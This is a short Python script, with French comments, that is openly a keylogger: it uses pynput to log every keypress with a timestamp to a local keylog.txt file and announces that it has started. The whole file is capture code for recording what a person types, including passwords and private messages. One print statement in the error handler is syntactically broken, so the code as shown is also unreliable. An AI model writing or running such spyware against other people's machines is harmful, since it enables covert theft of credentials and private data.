from pynput.keyboard import Listener
import logging
import os

# Chemin absolu pour être sûr de savoir où le fichier est créé
log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylog.txt")

logging.basicConfig(
    filename=log_path,
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s"
)

logger = logging.getLogger()
for handler in logger.handlers:
    handler.flush()

def on_press(key):
    try:
        logging.info(str(key))

        for handler in logging.getLogger().handlers:
            handler.flush()
    except Exception as e:
        print(f"Erreur : {e}

with Listener(on_press=on_press) as listener:
    print(f"Keylogger lancé. Fichier : {log_path}")
    listener.join()